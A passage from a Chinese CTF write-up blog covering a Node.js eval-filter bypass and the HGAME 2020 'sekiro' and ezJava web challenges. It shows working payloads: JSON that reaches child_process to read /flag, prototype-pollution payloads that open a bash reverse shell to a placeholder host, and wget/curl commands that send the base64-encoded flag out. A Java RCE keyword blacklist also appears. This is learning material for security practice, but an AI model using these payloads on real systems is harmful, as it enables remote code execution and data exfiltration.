Wrong Wrong!!!'</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">        result = <span class="string">'Wrong Wrong Wrong!!!'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      results.unshift(<span class="string">`<span class="subst">$&#123;req.body.e&#125;</span>=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    results.unshift(<span class="string">'Not verified!'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (results.length &gt; <span class="number">13</span>) &#123;</span><br><span class="line">    results.pop();</span><br><span class="line">  &#125;</span><br><span class="line">  req.session.results = results;</span><br><span class="line">  res.send(render(req.session.results));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span></span><br><span class="line">app.get(<span class="string">'/source'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">'Content-Type'</span>, <span class="string">'text/javascript;charset=utf-8'</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">'./index.js'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">'Content-Type'</span>, <span class="string">'text/html;charset=utf-8'</span>);</span><br><span class="line">  req.session.admin = req.session.admin || <span class="number">0</span>;</span><br><span class="line">  res.send(render(req.session.results = req.session.results || []))</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">80</span>, <span class="string">'0.0.0.0'</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Start listening'</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>出现</p><blockquote><p>app.use(bodyParser.json());接收json请求<br>json绕过<br>首先要满足<br>first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;first&quot;:&#123;&quot;length&quot;:&quot;1&quot;&#125;,&quot;second&quot;:&#123;&quot;length&quot;:&quot;1&quot;&#125;</span><br></pre></td></tr></table></figure></p></blockquote><p>设定first与second的length值相等，本质上first和second在此时是不同的两个对象(地址不同)<br>而对于md5的相等,与string相加时会强制转换为string，而first与second的string值是相同的<br>之后尝试绕过<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123; <span class="comment">//e</span></span><br><span class="line">  <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">''</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>stringObject.replace(regexp/substr,replacement)<br>如果 regexp 具有全局标志 g，那么 replace() 方法将替换所有匹配的子串。否则，它只替换第一个匹配子串<br>对于<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)|</span><br></pre></td></tr></table></figure></p></blockquote><p><img src="Ha1cyon-CTF/06.png" alt=""></p><blockquote><p>\w+匹配数字和字母下划线的多个字符<br>通过原型链实现RCE<br>无法直接输入字符串,Math.__proto__无法直接利用<br><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Arrow_functions" target="_blank" rel="noopener">Arrow function expressions</a></p></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">f"return process.mainModule.require('child_process').execSync('cat /flag').toString()"</span></span><br><span class="line">a=<span class="string">','</span>.join([str(ord(i)) <span class="keyword">for</span> i <span class="keyword">in</span> s])</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;e&quot;:&quot;(Math=&gt;(Math=Math.constructor,Math=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)&quot;,&quot;first&quot;:&#123;&quot;length&quot;:&quot;1&quot;&#125;,&quot;second&quot;:&#123;&quot;length&quot;:&quot;1&quot;&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>Math+1=&gt;Math+字符串得到一个string类型的对象(不能直接输入字符串)</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="抽象带师"><a href="#抽象带师" class="headerlink" title="抽象带师"></a>抽象带师</h2><p>翻译成地球人文字即可</p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="这是什么觅🐎"><a href="#这是什么觅🐎" class="headerlink" title="这是什么觅🐎"></a>这是什么觅🐎</h2><p><img src="Ha1cyon-CTF/01.jpg" alt=""><br>小字：F1 W1 S22 S21 T12 S11 W1 S13<br>S和T都是两位数其他都是一位数，日历表上以T，S开头的星期也正好有两个，所以猜测这个会与星期所关联    </p><p><a href="https://wenku.baidu.com/view/a01fc4f9f705cc17552709d1?qq-pf-to=pcqq.c2c" target="_blank" rel="noopener">日历密码</a><br>根据👆即可解出calendar</p><h2 id="Classical-Cipher"><a href="#Classical-Cipher" class="headerlink" title="Classical Cipher"></a>Classical Cipher</h2><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">压缩包密码：gsv_pvb_rh_zgyzhs</span><br><span class="line"></span><br><span class="line">对应明文：   ***_key_**_******</span><br></pre></td></tr></table></figure></p><p>已知部分明文和全部密文求全部明文<br>‘p’-‘a’+’k’-‘a’=25(对应关系)<br><img src="Ha1cyon-CTF/02.png" alt=""><br>猪圈密码+非斯的象形文字=&gt;<br>原来猪圈密码是变形版的  </p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame2020week4_wp</title>
      <link href="/2020/02/18/hgame2020week4-wp/"/>
      <url>/2020/02/18/hgame2020week4-wp/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/vidar-team/Hgame2020_writeup/blob/master/week4/HGAME%202020%20Week4%20Official%20Writeup.pdf" target="_blank" rel="noopener">hgame_official_wp</a>  </p><p>感谢各位出题人的耐心解答！</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="sekiro"><a href="#sekiro" class="headerlink" title="sekiro"></a>sekiro</h2><p>题目提供了源码，结构是这样的<br><img src="wp4_img/0sekiro.png" alt=""><br>看起来应该是要读取flag中的内容<br>先看web\routes\index.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isObject = <span class="function"><span class="params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="built_in">Object</span>;</span><br><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>从<a href="https://www.mi1k7ea.com/2019/10/20/%E6%B5%85%E6%9E%90JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">浅析JavaScript原型链污染攻击</a> 可以得知源码中的merge和clone会触发原型链污染<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">'/action'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.session.sekiro) &#123;</span><br><span class="line">    res.end(<span class="string">"Session required."</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!req.session.sekiro.alive) &#123;</span><br><span class="line">    res.end(<span class="string">"You dead."</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> body = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(req.body));</span><br><span class="line">  <span class="keyword">var</span> copybody = clone(body)</span><br><span class="line">  <span class="keyword">if</span> (copybody.solution) &#123;</span><br><span class="line">    req.session.sekiro = Game.dealWithAttacks(req.session.sekiro, copybody.solution)</span><br><span class="line">  &#125;</span><br><span class="line">  res.end(<span class="string">"提交成功"</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>发现此处调用了clone函数,在solution存在的情况下会调用Game.dealWithAttacks()，再在\web\utils查看具体内容<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.dealWithAttacks = <span class="function"><span class="keyword">function</span> (<span class="params">sekiro, solution</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (sekiro.attackInfo.solution !== solution) &#123;</span><br><span class="line">            sekiro.health -= sekiro.attackInfo.attack</span><br><span class="line">            <span class="keyword">if</span> (sekiro.attackInfo.additionalEffect) &#123;</span><br><span class="line">                <span class="keyword">var</span> fn = <span class="built_in">Function</span>(<span class="string">"sekiro"</span>, sekiro.attackInfo.additionalEffect + <span class="string">"\nreturn sekiro"</span>)</span><br><span class="line">                sekiro = fn(sekiro)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sekiro.posture = (sekiro.posture &lt;= <span class="number">500</span>) ? sekiro.posture : <span class="number">500</span></span><br><span class="line">        sekiro.health = (sekiro.health &gt; <span class="number">0</span>) ? sekiro.health : <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> (sekiro.posture == <span class="number">500</span> || sekiro.health == <span class="number">0</span>) &#123;</span><br><span class="line">            sekiro.alive = <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sekiro</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>发现<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fn = <span class="built_in">Function</span>(<span class="string">"sekiro"</span>, sekiro.attackInfo.additionalEffect + <span class="string">"\nreturn sekiro"</span>)</span><br><span class="line">                sekiro = fn(sekiro)</span><br></pre></td></tr></table></figure></p><p>可以通过改变sekiro.attackInfo.additionalEffect的值，在调用fn时实现远程命令执行<br>可以发现条件是 sekiro.attackInfo.solution !== solution<br>而在attack中<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.attacks = [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"method"</span>: <span class="string">"连续砍击"</span>,</span><br><span class="line">            <span class="string">"attack"</span>: <span class="number">1000</span>,</span><br><span class="line">            <span class="string">"additionalEffect"</span>: <span class="string">"sekiro.posture+=100"</span>,</span><br><span class="line">            <span class="string">"solution"</span>: <span class="string">"连续格挡"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"method"</span>: <span class="string">"普通攻击"</span>,</span><br><span class="line">            <span class="string">"attack"</span>: <span class="number">500</span>,</span><br><span class="line">            <span class="string">"additionalEffect"</span>: <span class="string">"sekiro.posture+=50"</span>,</span><br><span class="line">            <span class="string">"solution"</span>: <span class="string">"格挡"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"method"</span>: <span class="string">"下段攻击"</span>,</span><br><span class="line">            <span class="string">"attack"</span>: <span class="number">1000</span>,</span><br><span class="line">            <span class="string">"solution"</span>: <span class="string">"跳跃踩头"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"method"</span>: <span class="string">"突刺攻击"</span>,</span><br><span class="line">            <span class="string">"attack"</span>: <span class="number">1000</span>,</span><br><span class="line">            <span class="string">"solution"</span>: <span class="string">"识破"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"method"</span>: <span class="string">"巴之雷"</span>,</span><br><span class="line">            <span class="string">"attack"</span>: <span class="number">1000</span>,</span><br><span class="line">            <span class="string">"solution"</span>: <span class="string">"雷反"</span></span><br><span class="line">        &#125;,</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure></p><p>通过原型链污染的条件，我们要在攻击没有additionalEffect属性时发送我们的payload<br>说实话不知道为啥老是接收不到数据…<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"solution"</span>:<span class="number">0</span>,<span class="string">"__proto__"</span>:&#123;<span class="string">"additionalEffect"</span>: <span class="string">"return e =&gt; &#123; for (var a in &#123;&#125;)&#123;delete Object.prototype[a];&#125; return global.process.mainModule.require('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/_ip/_port 0&gt;&amp;1\"')&#125;\n"</span>&#125;&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"solution"</span>:<span class="number">0</span>,<span class="string">"__proto__"</span>:&#123;<span class="string">"additionalEffect"</span>:<span class="string">" return e =&gt; &#123; for (var a in &#123;&#125;)&#123;delete Object.prototype[a];&#125;global.process.mainModule.constructor._load('child_process').exec('wget _ip/_port?$(cat /flag|base64)'.function()&#123;&#125;)"</span></span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure><p>这俩我都失败了，但是学长试了第二个说是可以拿到flag的?感觉是我操作问题…<br>后来利用curl来执行命令终于成功了一次…<br>payload成功变成了这样<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"solution"</span>:<span class="string">"0"</span>,</span><br><span class="line">    <span class="string">"__proto__"</span>:&#123;</span><br><span class="line">        <span class="string">"additionalEffect"</span>:<span class="string">"global.process.mainModule.constructor._load('child_process').execSync('curl http://_ip:_apache_port/?flag=`cat ../../../flag|base64`')"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>先访问/info /attack界面，确定攻击满足条件后，再post /action，发送payload，最后从apache日志里找access记录<br>但是这个对我来说也是看运气，试了N遍就成功了一次…后面再尝试的时候又收不到了…  </p><h1 id="赛后"><a href="#赛后" class="headerlink" title="赛后"></a>赛后</h1><h2 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h2><h3 id="ezJava"><a href="#ezJava" class="headerlink" title="ezJava"></a>ezJava</h3><p>出题人一开始给了俩网址提示<br><a href="http://rui0.cn/archives/1015" target="_blank" rel="noopener">Code-Breaking Puzzles — javacon WriteUp</a><br><a href="https://jolokia.org/reference/html/protocol.html" target="_blank" rel="noopener">jolokia</a><br>再结合下题目<br><img src="wp4_img/5.png" alt=""><br>打开是一个登录表单<br><img src="wp4_img/1.png" alt=""><br>先猜一下username=admin，password=admin，正好是正确的<br><a href="https://www.jianshu.com/p/af9738634a21" target="_blank" rel="noopener">Spring Boot Actuator 使用</a><br><a href="https://www.anquanke.com/post/id/173262" target="_blank" rel="noopener">Attack Spring Boot Actuator via jolokia Part 1</a><br>根据上面这两篇文章以及提示，我们访问<br><a href="http://ezspel.hgame.wz22.cc/actuator/env" target="_blank" rel="noopener">http://ezspel.hgame.wz22.cc/actuator/env</a><br>正好看见application.yml<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">            &quot;name&quot;: &quot;applicationConfig: [classpath:/application.yml]&quot;,</span><br><span class="line">            &quot;properties&quot;: &#123;</span><br><span class="line">                &quot;server.port&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: 9997,</span><br><span class="line">                    &quot;origin&quot;: &quot;class path resource [application.yml]:2:9&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;spring.application.name&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;ezSpel&quot;,</span><br><span class="line">                    &quot;origin&quot;: &quot;class path resource [application.yml]:6:7&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;management.endpoint.shutdown.enabled&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: false,</span><br><span class="line">                    &quot;origin&quot;: &quot;class path resource [application.yml]:10:16&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;management.endpoint.jolokia.config.debug&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: true,</span><br><span class="line">                    &quot;origin&quot;: &quot;class path resource [application.yml]:13:16&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;management.endpoints.web.exposure.include&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;info,jolokia,env&quot;,</span><br><span class="line">                    &quot;origin&quot;: &quot;class path resource [application.yml]:17:18&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;keywords.blacklist[0]&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;java.+lang&quot;,</span><br><span class="line">                    &quot;origin&quot;: &quot;class path resource [application.yml]:21:7&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;keywords.blacklist[1]&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;Runtime&quot;,</span><br><span class="line">                    &quot;origin&quot;: &quot;class path resource [application.yml]:22:7&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;keywords.blacklist[2]&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;exec.*\\(&quot;,</span><br><span class="line">                    &quot;origin&quot;: &quot;class path resource [application.yml]:23:7&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;keywords.blacklist[3]&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;getClass&quot;,</span><br><span class="line">                    &quot;origin&quot;: &quot;class path resource [application.yml]:24:7&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;keywords.blacklist[4]&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;forName&quot;,</span><br><span class="line">                    &quot;origin&quot;: &quot;class path resource [application.yml]:25:7&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;user.username&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;admin&quot;,</span><br><span class="line">                    &quot;origin&quot;: &quot;class path resource [application.yml]:28:13&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;user.password&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;******&quot;,</span><br><span class="line">                    &quot;origin&quot;: &quot;class path resource [application.yml]:29:13&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;user.encParam1&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;hgamehgamehgame&#123;&quot;,</span><br><span class="line">                    &quot;origin&quot;: &quot;class path resource [application.yml]:30:14&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;user.encParam2&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;spppelandjookiaa&quot;,</span><br><span class="line">                    &quot;origin&quot;: &quot;class path resource [application.yml]:31:14&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;class path resource [application.yml]:class path resource [application.yml]&quot;,</span><br><span class="line">            &quot;properties&quot;: &#123;</span><br><span class="line">                &quot;ezSpel&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;include&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;info,jolokia,env&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;-&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;forName&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;password&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;******&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;web&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;username&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;admin&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;blacklist&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;endpoint&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;endpoints&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;encParam2&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;spppelandjookiaa&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;encParam1&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;hgamehgamehgame&#123;&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;application&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;keywords&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;management&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;enabled&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;false&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;port&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;9997&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;spring&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;debug&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;true&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;shutdown&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;server&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;jolokia&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;exposure&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;config&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: 